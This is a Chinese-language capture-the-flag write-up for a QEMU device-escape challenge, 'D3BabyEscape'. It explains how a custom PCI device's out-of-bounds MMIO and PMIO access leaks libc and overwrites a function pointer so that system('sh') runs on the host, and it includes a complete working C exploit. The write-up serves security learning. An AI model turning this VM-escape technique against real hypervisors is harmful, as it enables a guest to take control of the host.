# D3BabyEscape

## 题目简述

这是一道入门级 QEMU 设备逃逸题。自定义 PCI 设备的状态结构在 `buf` 后连续保存了三个 libc 函数指针：

```c
typedef struct L0PCIDevState {
    PCIDevice parent_obj;
    unsigned int base;
    MemoryRegion mmio;
    MemoryRegion pmio;
    uint32_t addr;
    uint8_t buf[L0DEV_BUF_SIZE];
    void (*srand)(unsigned int seed);
    int (*rand)(void);
    int (*rand_r)(unsigned int *seed);
} L0PCIDevState;
```

MMIO 写操作允许把 `base` 设置到 256，而后续 MMIO 读写都用 `buf[base + addr]`，没有检查结果是否越过 `buf`。这可泄露 `buf` 后方的 `rand_r` 指针。PMIO 侧还存在一个由全局 `key` 控制的越界写分支；触发后可把 `rand_r` 的低 4 字节改成 `system`，最后让设备以字符串 `"sh"` 的地址调用该函数指针。

## 解题过程

### MMIO 越界读

设备的 MMIO 读函数计算：

```c
pos = l0->base + (unsigned int)addr;
memcpy(&val, &l0->buf[pos], size);
```

MMIO 写函数在 `pos == 128` 时接受不大于 256 的新基址：

```c
case 128:
    if (val <= 256) {
        l0->base = (unsigned int)val;
    }
    break;
```

先向 MMIO 偏移 `0x80` 写入 256，之后访问 MMIO 偏移 `0x10` 与 `0x14`，实际会读取 `buf + 0x110` 和 `buf + 0x114`。按题目结构布局，这两个 32 位值组成 `rand_r` 函数指针。设备的端序设置使官方利用按“前一段为高 32 位、后一段为低 32 位”重组：

$$
\mathrm{rand\_r}
=\mathrm{read32}(0x10)\ll32+\mathrm{read32}(0x14)
$$

题目 libc 中：

```text
rand_r offset = 0x46780
system offset = 0x50d70
```

于是：

$$
\mathrm{libc\_base}=\mathrm{rand\_r}-0x46780
$$

$$
\mathrm{system}=\mathrm{libc\_base}+0x50d70
$$

### 解锁 PMIO 越界写

PMIO 读函数在读出的 32 位值等于 666 时执行 `key += 1`。因此先向某个正常 PMIO 位置写入 666，再从同一位置读回，即可让 `key` 非零。

此后 PMIO 写进入：

```c
pos = l0->base + (unsigned int)addr;
memcpy(&l0->buf[pos], &val, size);
```

此时 `base` 仍为 256。向 PMIO 偏移 `0x14` 写入 `system` 的低 32 位，正好覆盖 `rand_r` 指针的低半部；`rand_r` 与 `system` 同属一个 libc 映射，高 32 位保持不变。

### 触发被覆盖的函数指针

把 `base` 恢复为 0，再向 MMIO 偏移 `0x40` 写入小端字符串 `"sh\x00"`。该偏移命中下面的特殊分支：

```c
case 64:
    seed = val;
    pos = l0->rand_r(&val) % 256;
    memcpy(&l0->buf[pos], &val, size);
    break;
```

`rand_r` 已被替换为 `system`，而传入的参数 `&val` 指向 `"sh\x00"`，所以实际执行 `system("sh")`，从 QEMU 宿主进程上下文启动 shell。

### 完整利用代码

```c
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/io.h>
#include <sys/mman.h>
#include <unistd.h>

#define SYSTEM_OFFSET 0x50d70UL
#define RAND_R_OFFSET 0x46780UL
#define PMIO_BASE 0xc000U

static void die(const char *message)
{
    perror(message);
    exit(EXIT_FAILURE);
}

static void mmio_write(volatile uint32_t *base, size_t index, uint32_t value)
{
    base[index] = value;
}

static uint32_t mmio_read(volatile uint32_t *base, size_t index)
{
    return base[index];
}

static void pmio_write(uint32_t offset, uint32_t value)
{
    outl(value, PMIO_BASE + offset);
}

static uint32_t pmio_read(uint32_t offset)
{
    return inl(PMIO_BASE + offset);
}

int main(void)
{
    if (iopl(3) != 0) {
        die("iopl");
    }

    int fd = open(
        "/sys/devices/pci0000:00/0000:00:04.0/resource0",
        O_RDWR | O_SYNC
    );
    if (fd < 0) {
        die("open resource0");
    }

    volatile uint32_t *mmio = mmap(
        NULL,
        0x1000,
        PROT_READ | PROT_WRITE,
        MAP_SHARED,
        fd,
        0
    );
    if (mmio == MAP_FAILED) {
        die("mmap");
    }

    /* MMIO byte offset 0x80: set l0->base to 256. */
    mmio_write(mmio, 0x80 / 4, 256);

    uint64_t rand_r_addr =
        ((uint64_t)mmio_read(mmio, 0x10 / 4) << 32)
        | mmio_read(mmio, 0x14 / 4);
    uint64_t libc_base = rand_r_addr - RAND_R_OFFSET;
    uint64_t system_addr = libc_base + SYSTEM_OFFSET;

    printf("[+] rand_r = %#lx\n", rand_r_addr);
    printf("[+] libc   = %#lx\n", libc_base);
    printf("[+] system = %#lx\n", system_addr);

    /* 写入并读回 666，使 key 递增。 */
    pmio_write(0x10, 666);
    if (pmio_read(0x10) != 666) {
        fputs("[-] failed to unlock PMIO write\n", stderr);
        return EXIT_FAILURE;
    }

    /* base=256，偏移 0x14 命中 rand_r 的低 32 位。 */
    pmio_write(0x14, (uint32_t)system_addr);

    /* 恢复 base，并令 MMIO 0x40 分支调用 system(\"sh\"). */
    mmio_write(mmio, 0x80 / 4, 0);
    uint64_t command = 0;
    memcpy(&command, "sh", 3);
    *(volatile uint64_t *)((volatile uint8_t *)mmio + 0x40) = command;

    munmap((void *)mmio, 0x1000);
    close(fd);
    return 0;
}
```

在题目 guest 中编译：

```bash
gcc exp.c -o exp -static
```

程序需要访问 PCI resource 并执行 `iopl(3)`，因此必须在题目提供的高权限 guest 环境中运行。PCI 地址、PMIO 基址和 libc 偏移均由附件决定。

## 方法总结

利用链是“MMIO 可控基址导致越界读→函数指针泄露 libc→PMIO 状态机解锁越界写→局部覆盖函数指针→参数类型混淆触发 `system`”。题目之所以只需覆盖低 4 字节，是因为源函数和目标函数位于同一个 libc 映射；如果目标跨映射或 ASLR 使高位不同，就必须寻找完整 8 字节写。

分析 QEMU 设备时，应同时画出设备状态结构与各 I/O 回调的偏移计算。单看 `buf` 的访问似乎受 `addr` 限制，但把可控 `base`、缺失的总长度检查以及紧邻缓冲区的函数指针结合起来，才会得到完整的逃逸原语。
